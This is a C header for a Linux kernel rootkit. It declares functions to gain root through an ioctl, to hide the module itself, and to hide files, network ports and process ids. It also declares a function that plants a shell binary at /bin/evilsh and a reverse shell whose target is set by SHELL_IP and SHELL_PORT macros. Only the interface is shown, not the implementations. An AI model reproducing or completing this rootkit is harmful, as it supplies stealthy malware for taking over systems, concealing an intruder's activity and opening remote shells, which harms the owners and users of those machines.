#include <linux/mutex.h>
#include "bash.h"
#include "devices.h"
#include "fs_helper.h"
#include "internel.h"
#include "syscall_helper.h"

#define SHELL_IP "127.0.0.1"
#define SHELL_PORT "1234"

enum operation_num { GET_ROOT, SHOW_MODULE, HIDE_MODULE };

struct struct_list {
    union {
        char *name;
        unsigned long num;
    };
    struct list_head list;
    char data[0];
};

/**
 * cmd_ioctl - VFS interface to execute command
 */
long cmd_ioctl(struct file *flip, unsigned int cmd, unsigned long arg);

void utils_init(void);

/**
 * hide_module - Hide the current module
 */
void hide_module(void);

/**
 * show_module - Show the current module
 */
void show_module(void);

/**
 * hide_file - Hide the file with substring name.
 */
void hide_file(const char *name);

/**
 * show_file - Show the file hided by `hide_file`.
 */
void show_file(const char *name);

/**
 * hide_port - Hide the port shown by /proc/net/tcp and /proc/net/udp
 */
void hide_port(unsigned int port);


/**
 * show_port - Show the port hided by `hide_port`
 */
void show_port(unsigned int port);


/**
 * hide_pid - Hide the pid by remove the element from radix tree
 */
void hide_pid(unsigned int tgid);


/**
 * show_pid - Show the pid hided by `hide_pid`
 */
void show_pid(unsigned int tgid);

/**
 * swap_pid - Swap two pid
 *
 * Note that programmers have to gurantee that they are valid pid
 */
void swap_pid(unsigned int tgid1, unsigned int tgid2);

/**
 * shell_init - Write bash binary into /bin/evilsh
 */
void shell_init(void);

/**
 * shell_start - Start the remote shell
 *
 * The ip and port can be set by macro SHELL_IP and SHELL_PORT
 * This shell is a reverse shell, redirecting its input and output to the target
 * ip and port
 */
void shell_start(void);
